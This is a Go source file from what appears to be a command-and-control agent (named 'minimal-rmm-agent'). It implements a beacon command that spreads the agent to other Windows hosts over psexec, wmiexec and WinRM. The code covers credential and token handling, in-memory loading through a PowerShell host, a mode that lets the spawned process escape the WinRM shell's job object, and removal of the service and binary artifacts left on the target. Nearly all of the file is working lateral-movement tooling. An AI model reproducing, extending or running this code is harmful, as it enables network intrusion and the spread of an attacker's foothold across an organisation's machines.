package main

import (
	"context"
	_ "embed"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

// embeddedLateralService carries the dedicated lateral service host with
// its linked stage1 worker inside this agent, the way RemCom embeds its
// service and extracts it at runtime. The placeholder is replaced by the
// real service host when the server builds the agent (see build_go_agent
// in server_rmm.py).
//
//go:embed lateral-service.bin
var embeddedLateralService []byte

// lateralPayload carries the lateral movement request as a JSON body on the
// __LATERAL__ beacon command, mirroring __MAKE_TOKEN__.
// lateralIdentity carries operator-supplied credentials that force the
// network identity of one lateral deployment. It travels like make_token
// credentials: JSON body fields in memory, never logged and never echoed in
// error text. Explicit credentials take precedence over the ambient
// make_token token for the wmiexec and winrm methods.
type lateralIdentity struct {
	Domain   string `json:"domain"`
	User     string `json:"user"`
	Password string `json:"password"`
}

type lateralPayload struct {
	Method         string           `json:"method"`
	Host           string           `json:"host"`
	SessionID      string           `json:"session_id"`
	WorkspaceID    *string          `json:"workspace_id,omitempty"`
	RemoteName     string           `json:"remote_name"`
	Stage          string           `json:"stage"`
	Loader         string           `json:"loader,omitempty"`
	PayloadSHA256  string           `json:"payload_sha256,omitempty"`
	TimeoutSeconds float64          `json:"timeout_seconds"`
	HTTPS          bool             `json:"https,omitempty"`
	Insecure       bool             `json:"insecure,omitempty"`
	Identity       *lateralIdentity `json:"identity,omitempty"`
	winrmIdentity  *winrmCredentials
	// ambientToken carries the lateral worker's captured identity handle
	// (uintptr transport: the field compiles on every platform) to the WMI
	// chain, which applies it on the COM worker thread for the cloaked
	// ambient connect. Unexported, never serialized.
	ambientToken uintptr
	// loaderDeploy marks the server-sourced deployment chain: the agent
	// artifact bytes come from the staging endpoint instead of this
	// process's own binary, so the source session's hosting mode is
	// irrelevant to the deployment.
	loaderDeploy bool
	// independentLifetime selects the WinRM loader mode whose target host
	// process escapes the shell job through a local WMI re-stage: the
	// source tears the WinRM session down as soon as the independent
	// receiver confirms readiness, instead of holding the shell.
	independentLifetime bool
}

var lateralMethods = map[string]bool{
	"psexec":  true,
	"wmiexec": true,
	"winrm":   true,
}

// lateralSHA256Pattern matches the lowercase hex digest the server records
// for the staged deployment artifact.
var lateralSHA256Pattern = regexp.MustCompile(`^[a-f0-9]{64}$`)

// errLoaderReserved rejects the PowerShell loader implementation, reserved on
// every surface for a later release. The failure is explicit so an operator
// never mistakes it for a silently substituted csharp deployment.
var errLoaderReserved = errors.New("loader powershell is reserved and not supported in this release; use loader csharp")

// lateralHostIsIP reports whether a lateral target is an IP literal rather
// than a DNS name. WMI selects NTLM for IP literals and Kerberos for DNS
// names; WSMan selects Negotiate and Kerberos respectively. SMB staging
// and psexec retain Windows negotiation and may fall back to NTLM for DNS.
func lateralHostIsIP(host string) bool {
	return net.ParseIP(strings.TrimSpace(host)) != nil
}

// The staged binary name becomes part of the service binPath, so it must be a
// simple filename without spaces or separators.
var lateralRemoteNamePattern = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.exe$`)

type lateralResult struct {
	result string
	err    error
}

// memoryHostedEnv marks an agent that the WinRM receiver loaded into its
// PowerShell host process instead of starting it from an on-disk executable.
const memoryHostedEnv = "RMM_IN_MEMORY"

// errMemoryHosted explains why a self-relaunching operation cannot run from
// an in-memory session: os.Executable() and os.Args[0] name the host process.
var errMemoryHosted = errors.New("this session is loaded in memory; the operation requires an on-disk agent deployment")

// memoryHosted reports whether this instance runs inside its loader host.
func memoryHosted() bool {
	return os.Getenv(memoryHostedEnv) == "1"
}

// lateralUsesSelfBinary reports whether a lateral method depends on this
// process's own binary. Legacy wmiexec copies it to ADMIN$ and legacy winrm
// streams it; both keep refusing to run from an in-memory host. A psexec
// deployment stages the embedded dedicated lateral service, and its cleanup
// retry runs a separate PowerShell worker, so neither half of psexec touches
// this binary. Loader deployments stream a server-staged artifact instead, so
// a memory-hosted source may run them too: guarding on the dependency instead
// of the hosting mode keeps the acceptance list honest wherever the artifact
// and the cleanup mechanism do not involve this process's image.
func lateralUsesSelfBinary(payload lateralPayload) bool {
	return !payload.loaderDeploy && payload.Method != "psexec"
}

// rpcETooLate is CoInitializeSecurity's rejection when process-wide COM
// security was already configured by an earlier initializer.
const rpcETooLate uintptr = 0x80010119

// wmiSecurityResult decides whether a CoInitializeSecurity HRESULT lets the
// lateral COM machinery proceed. A memory-hosted agent runs inside its
// PowerShell loader host, and the CLR configured process COM security
// before this code could: rejecting that state would block every lateral
// deployment from an in-memory source, the loader chain's flagship
// scenario. Accepting it is safe for the WMI chain because the per-proxy
// CoSetProxyBlanket calls still apply dynamic cloaking and packet privacy
// to the actual interface calls; the caveat is that the initial remote
// connect authenticates with the host process security rather than a
// make_token thread token. Any other pre-initialized state on an on-disk
// agent stays fail-closed, because its blanket owner is unknown.
func wmiSecurityResult(hr uintptr) error {
	switch {
	case hr == 0:
		return nil
	case hr == rpcETooLate && memoryHosted():
		return nil
	case hr == rpcETooLate:
		return errors.New("CoInitializeSecurity with thread cloaking rejected: process COM security was already initialized by another component (0x80010119)")
	default:
		return fmt.Errorf("CoInitializeSecurity with thread cloaking failed: 0x%08x", hr)
	}
}

// awaitLateralResult preserves acknowledged artifacts when the command expires.
func awaitLateralResult(ctx context.Context, results <-chan lateralResult, progress <-chan string) (string, error) {
	select {
	case r := <-results:
		return r.result, r.err
	case <-ctx.Done():
		select {
		case r := <-results:
			return r.result, r.err
		default:
		}
		select {
		case ack := <-progress:
			return ack + "\nlateral cleanup pending: command deadline exceeded; worker may still be running", nil
		default:
			return "", errors.New("lateral move timed out; the worker may still be running and the target may still be starting")
		}
	}
}

// errLateralHostBusy explains why a retry was refused while an earlier
// worker may still be running on the same target host.
var errLateralHostBusy = errors.New("a lateral deployment to this host is already in progress in this agent; wait for it to finish before retrying")

// lateralInFlight tracks deployments whose worker may still run after the
// command deadline. The Go deadline ends waiting, not native SMB/SCM/COM
// execution, so without this guard an immediate retry would stack a second
// deployment on the same host while the first is still progressing.
var lateralInFlight = struct {
	sync.Mutex
	hosts map[string]bool
}{hosts: make(map[string]bool)}

// claimLateralHost reserves the target host for one deployment at a time.
func claimLateralHost(host string) error {
	lateralInFlight.Lock()
	defer lateralInFlight.Unlock()
	if lateralInFlight.hosts[host] {
		return fmt.Errorf("%w: %s", errLateralHostBusy, host)
	}
	lateralInFlight.hosts[host] = true
	return nil
}

// releaseLateralHost frees the host reservation once its worker has fully
// completed; an unclaimed host is a no-op so test seams cannot strand locks.
func releaseLateralHost(host string) {
	lateralInFlight.Lock()
	delete(lateralInFlight.hosts, host)
	lateralInFlight.Unlock()
}

func parseLateralPayload(command string) (lateralPayload, error) {
	var payload lateralPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := rejectCommandDebugOption([]byte(parts[1])); err != nil {
		return payload, err
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	// encoding/json treats null as a no-op for bool fields. Reject it here
	// rather than silently selecting HTTP for an invalid transport option.
	var transport struct {
		HTTPS    json.RawMessage `json:"https"`
		Insecure json.RawMessage `json:"insecure"`
	}
	if err := json.Unmarshal([]byte(parts[1]), &transport); err != nil {
		return payload, err
	}
	if strings.TrimSpace(string(transport.HTTPS)) == "null" {
		return payload, errors.New("https must be a boolean")
	}
	if strings.TrimSpace(string(transport.Insecure)) == "null" {
		return payload, errors.New("insecure must be a boolean")
	}
	payload.Method = strings.ToLower(strings.TrimSpace(payload.Method))
	// The HTTPS wire method is intentionally unknown to older agents. They
	// must reject it rather than silently ignore https and connect over HTTP.
	if payload.Method == "winrm_https" {
		payload.Method, payload.HTTPS = "winrm", true
	}
	if payload.Method == "winrm_https_insecure" {
		if len(transport.Insecure) != 0 && !payload.Insecure {
			return payload, errors.New("insecure wire method conflicts with certificate validation")
		}
		payload.Method, payload.HTTPS, payload.Insecure = "winrm", true, true
	}
	// Loader deployments use their own wire-method names for the same reason
	// as HTTPS: an older agent must reject the request instead of ignoring
	// the new fields and silently deploying a copy of its own binary.
	switch payload.Method {
	case "wmiexec_loader":
		payload.Method, payload.loaderDeploy = "wmiexec", true
	case "winrm_loader":
		if payload.HTTPS {
			return payload, errors.New("https belongs to the winrm_https_loader wire method")
		}
		payload.Method, payload.loaderDeploy = "winrm", true
	case "winrm_https_loader":
		if payload.Insecure {
			return payload, errors.New("insecure belongs to the winrm_https_insecure_loader wire method")
		}
		payload.Method, payload.HTTPS, payload.loaderDeploy = "winrm", true, true
	case "winrm_https_insecure_loader":
		if len(transport.Insecure) != 0 && !payload.Insecure {
			return payload, errors.New("insecure wire method conflicts with certificate validation")
		}
		payload.Method, payload.HTTPS, payload.Insecure, payload.loaderDeploy = "winrm", true, true, true
	case "winrm_loader_independent":
		if payload.HTTPS {
			return payload, errors.New("https belongs to the winrm_https_loader_independent wire method")
		}
		payload.Method, payload.loaderDeploy, payload.independentLifetime = "winrm", true, true
	case "winrm_https_loader_independent":
		if payload.Insecure {
			return payload, errors.New("insecure belongs to the winrm_https_insecure_loader_independent wire method")
		}
		payload.Method, payload.HTTPS, payload.loaderDeploy, payload.independentLifetime = "winrm", true, true, true
	case "winrm_https_insecure_loader_independent":
		if len(transport.Insecure) != 0 && !payload.Insecure {
			return payload, errors.New("insecure wire method conflicts with certificate validation")
		}
		payload.Method, payload.HTTPS, payload.Insecure, payload.loaderDeploy, payload.independentLifetime = "winrm", true, true, true, true
	}
	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
	payload.RemoteName = strings.TrimSpace(payload.RemoteName)
	if payload.RemoteName == "" {
		payload.RemoteName = "minimal-rmm-agent.exe"
	}
	if !lateralMethods[payload.Method] {
		return payload, errors.New("method must be one of psexec, wmiexec, winrm")
	}
	if payload.HTTPS && payload.Method != "winrm" {
		return payload, errors.New("https is supported only for winrm")
	}
	if payload.Insecure && (!payload.HTTPS || payload.Method != "winrm") {
		return payload, errors.New("insecure requires winrm HTTPS")
	}
	if payload.SessionID != "" && !regexp.MustCompile(`^[A-Za-z0-9_-]{8,128}$`).MatchString(payload.SessionID) {
		return payload, errors.New("invalid target session id")
	}
	if payload.WorkspaceID != nil && *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
		return payload, errors.New("invalid workspace id")
	}
	if payload.Host == "" {
		return payload, errors.New("host is required")
	}
	if payload.Method == "psexec" {
		// The psexec module pushes the dedicated lateral service host,
		// whose only capability is the staging reference created by the
		// listener.
		if !agentSessionIDPattern.MatchString(payload.Stage) {
			return payload, errors.New("psexec requires a staging reference from the listener")
		}
	}
	// The single-loader release accepts only csharp; powershell stays a
	// reserved value so later releases can ship it without changing the
	// command shape.
	payload.Loader = strings.ToLower(strings.TrimSpace(payload.Loader))
	switch payload.Loader {
	case "":
		payload.Loader = "csharp"
	case "csharp":
	default:
		if payload.Loader == "powershell" {
			return payload, errLoaderReserved
		}
		return payload, errors.New("loader must be csharp (powershell is reserved)")
	}
	if payload.loaderDeploy {
		if !agentSessionIDPattern.MatchString(payload.Stage) {
			return payload, errors.New("loader deployment requires a staging reference from the listener")
		}
		if !lateralSHA256Pattern.MatchString(payload.PayloadSHA256) {
			return payload, errors.New("loader deployment requires the staged payload SHA-256")
		}
	} else if payload.PayloadSHA256 != "" {
		return payload, errors.New("payload_sha256 requires a loader deployment method")
	}
	// Only the WinRM loader chain offers the independent lifetime: the
	// receiver re-stages through local WMI to escape the shell's job object.
	if payload.independentLifetime && (payload.Method != "winrm" || !payload.loaderDeploy) {
		return payload, errors.New("independent lifetime requires a winrm loader deployment")
	}
	if payload.Identity != nil {
		// Explicit credentials are wired into the wmiexec and winrm
		// methods only; psexec keeps its ambient SCM/SMB staging.
		if payload.Method != "wmiexec" && payload.Method != "winrm" {
			return payload, errors.New("identity requires the wmiexec or winrm method")
		}
		payload.Identity.Domain = strings.TrimSpace(payload.Identity.Domain)
		payload.Identity.User = strings.TrimSpace(payload.Identity.User)
		if payload.Identity.User == "" {
			return payload, errors.New("identity user is required")
		}
		if payload.Identity.Domain == "" && strings.Contains(payload.Identity.User, `\`) {
			payload.Identity.Domain, payload.Identity.User, _ = strings.Cut(payload.Identity.User, `\`)
			payload.Identity.Domain = strings.TrimSpace(payload.Identity.Domain)
			payload.Identity.User = strings.TrimSpace(payload.Identity.User)
			if payload.Identity.User == "" {
				return payload, errors.New("identity user is required")
			}
		}
	}
	if !lateralRemoteNamePattern.MatchString(payload.RemoteName) {
		return payload, errors.New("remote_name must be a simple .exe filename")
	}
	if payload.TimeoutSeconds <= 0 {
		payload.TimeoutSeconds = 300
	}
	if payload.TimeoutSeconds > 3600 {
		payload.TimeoutSeconds = 3600
	}
	return payload, nil
}

// lateralCommand handles __LATERAL__: start a copy of this agent on another
// host through the requested execution method.
//
// All methods use a pinned worker. Deadlines bound waiting, not native calls;
// the per-host claim is released only by the worker's own completion, so a
// caller-side timeout cannot free the reservation while work continues.
func lateralCommand(command string) (string, error) {
	payload, err := parseLateralPayload(command)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", errors.New("lateral movement requires the Windows agent build")
	}
	if err := claimLateralHost(payload.Host); err != nil {
		return "", err
	}
	ctx, cancel := context.WithTimeout(agentContext, time.Duration(payload.TimeoutSeconds*float64(time.Second)))
	defer cancel()

	return lateralThreadGoroutine(ctx, payload)
}

// lateralCleanupPayload identifies the deployment artifacts a psexec move
// left on the target: the temporary service and its host binary. The
// deployment identity and the ownership tag carry the control plane's durable
// proof that this exact deployment owns these artifacts.
type lateralCleanupPayload struct {
	Host        string `json:"host"`
	ServiceName string `json:"service_name"`
	BinaryName  string `json:"binary_name"`
	// DeploymentID names the recorded deployment that owns the artifacts.
	DeploymentID string `json:"deployment_id,omitempty"`
	// OwnershipTag is the beacon-secret HMAC over the deployment identity
	// and its exact artifacts; see verifyLateralCleanupOwnership.
	OwnershipTag string `json:"ownership_tag,omitempty"`
}

// Cleanup authority belongs to this source process, not to caller-supplied
// names. After restart or an unacknowledged launch, cleanup fails closed.
var lateralCleanupOwners = struct {
	sync.Mutex
	artifacts map[lateralCleanupPayload]bool
}{artifacts: make(map[lateralCleanupPayload]bool)}

var lateralCleanupNames = regexp.MustCompile(`^service=(MinimalRmmAgent-([a-f0-9]{32})) binary=([A-Za-z0-9][A-Za-z0-9._-]*\.exe)$`)

// rememberLateralCleanup records only the exact acknowledged psexec artifacts
// returned by our child for this request, including their shared random suffix.
func rememberLateralCleanup(request lateralPayload, result string) {
	if request.Method != "psexec" || request.SessionID == "" {
		return
	}
	first, remainder, _ := strings.Cut(result, "\n")
	if strings.HasPrefix(remainder, "lateral cleanup: ") {
		return
	}
	if remainder != "" && (!strings.HasPrefix(remainder, "lateral cleanup pending: ") || strings.Contains(remainder, "\n")) {
		return
	}
	result = first
	prefix := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s ", request.Host, request.SessionID)
	if !strings.HasPrefix(result, prefix) {
		return
	}
	match := lateralCleanupNames.FindStringSubmatch(strings.TrimPrefix(result, prefix))
	if match == nil || match[3] != strings.TrimSuffix(request.RemoteName, ".exe")+"-"+match[2]+".exe" {
		return
	}
	artifact := lateralCleanupPayload{Host: request.Host, ServiceName: match[1], BinaryName: match[3]}
	lateralCleanupOwners.Lock()
	defer lateralCleanupOwners.Unlock()
	lateralCleanupOwners.artifacts[artifact] = true
}

// ownsLateralCleanup requires an exact deployment record before any deletion.
func ownsLateralCleanup(payload lateralCleanupPayload) bool {
	lateralCleanupOwners.Lock()
	defer lateralCleanupOwners.Unlock()
	return lateralCleanupOwners.artifacts[payload]
}

func parseLateralCleanupPayload(command string) (lateralCleanupPayload, error) {
	var payload lateralCleanupPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
	if payload.Host == "" {
		return payload, errors.New("host is required")
	}
	if !regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$`).MatchString(payload.ServiceName) {
		return payload, errors.New("invalid service name")
	}
	if !lateralRemoteNamePattern.MatchString(payload.BinaryName) {
		return payload, errors.New("invalid binary name")
	}
	payload.DeploymentID = strings.TrimSpace(payload.DeploymentID)
	if payload.DeploymentID != "" && !agentSessionIDPattern.MatchString(payload.DeploymentID) {
		return payload, errors.New("invalid deployment id")
	}
	payload.OwnershipTag = strings.ToLower(strings.TrimSpace(payload.OwnershipTag))
	if payload.OwnershipTag != "" && !lateralSHA256Pattern.MatchString(payload.OwnershipTag) {
		return payload, errors.New("invalid ownership tag")
	}
	return payload, nil
}

// lateralCleanupCommand handles __LATERAL_CLEANUP__, the control plane's
// retry after a psexec move whose immediate caller-side cleanup stayed
// pending. The request must be authorized as owned by one deployment: either
// this process recorded the exact acknowledged artifacts, or the control
// plane presents the beacon-secret ownership tag bound to the recorded
// deployment. The work itself runs in the dedicated PowerShell cleanup
// worker — a bounded child process that is independent of the executable
// hosting this agent, so the retry behaves identically for an on-disk agent
// and an agent mapped inside a loader host.
func lateralCleanupCommand(command string) (string, error) {
	payload, err := parseLateralCleanupPayload(command)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", errors.New("lateral movement requires the Windows agent build")
	}
	if !lateralCleanupRequestAuthorized(payload) {
		return "", errors.New("cleanup request is not owned by an acknowledged deployment")
	}
	result, err := runLateralCleanupWorker(payload)
	if err != nil {
		return "", err
	}
	if !strings.HasPrefix(result, "lateral cleanup: ") {
		return "", fmt.Errorf("cleanup did not confirm success: %s", result)
	}
	lateralCleanupOwners.Lock()
	delete(lateralCleanupOwners.artifacts, payload)
	lateralCleanupOwners.Unlock()
	return result, nil
}
